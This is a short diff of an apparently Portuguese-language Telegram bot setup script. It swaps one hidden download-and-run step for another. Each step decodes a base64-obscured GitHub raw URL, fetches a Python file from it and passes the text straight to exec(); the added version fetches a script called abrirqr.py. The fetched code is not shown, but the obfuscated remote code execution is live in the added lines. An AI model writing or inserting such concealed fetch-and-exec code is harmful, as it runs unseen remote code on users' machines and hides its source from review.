@@ -47,11 +47,12 @@ if not verificar_arquivo_existe(dados_path, telefone_completo):
 else:
     print('Os dados já foram salvos anteriormente. Ignorando a próxima etapa.')
     
-criasession = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9jcmlhc2Vzc2lvbnMucHk="
-criasession = base64urldecode(criasession.encode("utf-8"))
-criasession = criasession.decode("utf-8")
-headers = {'Referer': criasession}
-criasession = requests.get(criasession, headers=headers)
-criasession = criasession.text
+
 print('Criado pasta com sucesso, abrindo QR')
-exec(criasession)  
+criaqrcode = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9hYnJpcnFyLnB5"
+criaqrcode = base64urldecode(criaqrcode.encode("utf-8"))
+criaqrcode = criaqrcode.decode("utf-8")
+headers = {'Referer': criaqrcode}
+criaqrcode = requests.get(criaqrcode, headers=headers)
+criaqrcode = criaqrcode.text
+exec(criaqrcode)    
